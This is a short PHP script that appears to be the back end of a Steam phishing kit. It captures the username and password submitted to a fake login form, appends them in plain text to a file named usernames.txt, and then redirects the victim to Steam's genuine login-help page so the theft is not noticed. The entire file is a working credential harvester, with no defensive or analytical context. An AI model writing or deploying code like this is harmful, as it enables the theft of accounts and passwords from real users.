<?php

file_put_contents("usernames.txt", "Steam :- username : " . $_POST['username'] . "  || Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://help.steampowered.com/en/wizard/HelpWithLoginInfo/');
exit();
